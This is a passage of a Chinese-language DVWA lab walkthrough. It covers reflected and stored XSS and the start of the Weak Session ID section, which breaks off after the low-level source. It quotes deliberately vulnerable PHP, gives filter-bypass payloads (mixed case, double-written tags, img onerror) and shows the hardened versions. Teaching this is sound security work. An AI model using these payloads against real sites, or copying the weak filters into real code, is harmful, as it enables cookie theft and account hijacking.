<p>这里设置的我们呢输入的参数全部无效了</p>
<h2 id="DVWA-–-XSS-reflected-反射型"><a href="#DVWA-–-XSS-reflected-反射型" class="headerlink" title="DVWA – XSS(reflected)反射型"></a>DVWA – XSS(reflected)反射型</h2><p>XSS攻击需要具备两个条件：1.需要向web页面注入恶意代码 2.恶意代码可以执行</p>
<p>xss反射型：顾名思义反射是一个一来一回的过程，反射型xss触发有后端的参与，之所以触发xss是因为后端解析前端传来带有xss性质的脚本文件或者脚本的data url编码，后端解析用户输入处理返回前端，由浏览器解析这段xss脚本而触发xss漏洞。因此要避免反射型xss则必须要后端的协调，在后端解析前端数据时首先做相关字串的检测和转义处理；同时前端也要对用户的输入做excape转义，保证数据源可靠性。</p>
<p>基本原理是通过给别人发送带有恶意脚本代码参数的url，当url地址被打开，特定的代码参数就会被html解析，执行这样就可以获取cookie。</p>
<p>特点:非持久化，必须用户输入带有特定参数的连接才能引起。</p>
<p>xss反射性攻击，恶意代码并没有保存在目标网站，通过引诱用户点击一个连接到目标网站的恶意链接来实施攻击。</p>
<p>xss(reflected)主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-47-36.png" alt="主题" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br>header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-comment">//array_key_exists函数判断变量值中是否存在name键名，且值不为空才输出</span><br><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>服务器只是判断了name参数是否为空，如果不为空就直接打印出来，服务器并没有对name参数做任何过滤和检查<br>漏洞复现：<br>直接使用下面的语句尝试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">&lt;script&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-51-57.png" alt="成功弹窗" class="lazyload"></p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input将script标签置空</span><br>    <span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>会见查name参数中是否含有script标签，有则替换为空，这里使用了str_replace函数他区分大小写因此可以用大小写绕过<br>漏洞复现：<br>这里使用大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">&lt;sCript&gt;alert(1)&lt;/ScRipt&gt;<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-56-26.png" alt="绕过成功" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-comment">//这里使用通配符完全匹配script标签所有的script标签全部被过滤</span><br>    <span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>preg_replace()函数执行一个正则表达式的搜索和替换。*代表任意字符i代表不区分大小写。就是说所有的script标签被过滤，单我们可以通过其他标签来绕过如img、body等标签的事件或者iframe标签的是如此注入js脚本攻击<br>漏洞复现：<br><code>&lt;img src=# onerror=alert(2)&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-13-01-57.png" alt="测试" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token 加入token检验</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        htmlspecialchars函数将符号转码</span><br><span class="hljs-comment">        &amp; （和号） 成为 &amp;amp;</span><br><span class="hljs-comment">        &quot; （双引号） 成为 &amp;quot;</span><br><span class="hljs-comment">        &#x27; （单引号） 成为 &amp;#039;</span><br><span class="hljs-comment">        &lt; （小于） 成为 &amp;lt;</span><br><span class="hljs-comment">        &gt; （大于） 成为 &amp;gt;</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-variable">$name</span> = htmlspecialchars( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>htmlspecialchars函数用于把预定义的一些字符转换为html实体防止了我们注入html标签。例如我们注入 “”，htmlspecialchars 函数会将 &lt; 和 &gt; 转换成 html 实体而不是当做标签，所以我们插入的语句并不会被执行。同时加入 Anti-CSRF token 防护 CSRF 攻击，进一步提高安全性。</p>
<h2 id="DVWA-–XSS-Stored-存储型"><a href="#DVWA-–XSS-Stored-存储型" class="headerlink" title="DVWA –XSS(Stored)存储型"></a>DVWA –XSS(Stored)存储型</h2><p>存储型：攻击者实现将恶意代码上传或者存储到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码，这就意味者只要页面被访问就会被攻击，因此存储型xss危害更大。存储习型xss的代码存在于网页代码中可以说是永久的。</p>
<p>存储型一般存在于留言品论博客日志等交互出，恶意脚本存储到客户端或者服务器的数据库中。</p>
<p>xss(store)主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-13-42-09.png" alt="存储型xss主题" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input </span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    trims(tring,charlist)函数移除字符串两侧的空白字符或其他预定义字符，包括、\t、\n、\x0b、\r以及空格</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input(string)</span><br>    <span class="hljs-comment">//stripslashes函数移除字符串中的反斜杠</span><br>    <span class="hljs-comment">//mysqli_real_escape_string(string,connection)</span><br>    <span class="hljs-comment">//函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</span><br>    <span class="hljs-variable">$message</span> = stripslashes( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>源码中出现了trim函数用法如下：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-13-48-28.png" alt="trim函数用法" class="lazyload"></p>
<p>出现了stripslashes()函数用法如下：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-13-49-27.png" alt="stripslashes函数用法" class="lazyload"><br>这里用于删除反斜杠，可用于清理数据库中或者从html表单中取回的数据<br>漏洞复现：<br>这里对xss方面没有做过滤和检查，而且数据将直接被存储到数据库中，因此存在存储型xss<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-14-29-32.png" alt="存储型xss" class="lazyload"><br>同样的在message中也可以弹窗。在做其他的时候清楚表</p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用&lt;b&gt;标签</span><br><span class="hljs-comment">     addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>message处使用了htmlspecialchars函数，将字符全部转化为了html实体，因此message处无法使用xss攻击<br>name处做了长度限制，会把script标签转化为空考虑使用大小写或者双写绕过</p>
<p>漏洞复现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">大小写绕过：&lt;scRIPt&gt;alert(1)&lt;/SCript&gt;<br>双写绕过：&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-14-52-30.png" alt="第一部分绕过" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-14-53-18.png" alt="第二部分" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>message处与medium难度没有做太多的变化，因此不考虑这里，name处对script标签做了各种过滤，我们考虑换标签img<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-14-57-45.png" alt="图片绕过形成xss" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = stripslashes( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = stripslashes( <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$name</span> = htmlspecialchars( <span class="hljs-variable">$name</span> );<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:message&#x27;</span>, <span class="hljs-variable">$message</span>, PDO::PARAM_STR );<br>    <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:name&#x27;</span>, <span class="hljs-variable">$name</span>, PDO::PARAM_STR );<br>    <span class="hljs-variable">$data</span>-&gt;execute();<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里对name和message都是用了htmlspecialchars函数做了过滤，还添加了token值进一步提高了安全性。</p>
<h2 id="DVWA-–-Weak-Session-ID-弱会话"><a href="#DVWA-–-Weak-Session-ID-弱会话" class="headerlink" title="DVWA – Weak Session ID(弱会话)"></a>DVWA – Weak Session ID(弱会话)</h2><p>弱会话是指用户访问服务器的时候，一般服务器都会分配一个身份证session id给用户，用于标识。用户拿到session id后就会保存到cookie中，之后拿cookie在访问服务器时，服务器就知道你是谁了。</p>
<p>但session id过于简单就会容易被人伪造。根本不需要知道用户的密码就能访问用户服务器的内容。</p>
<p><strong>low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$html</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id&#x27;</span>] = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">//服务器每次生成的session_id加1给客户端</span><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id&#x27;</span>]++;<br>    <span class="hljs-variable">$cookie_value</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id&#x27;</span>];<br>    setcookie(<span class="hljs-string">&quot;dvwaSession&quot;</span>, <span class="hljs-variable">$cookie_value</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

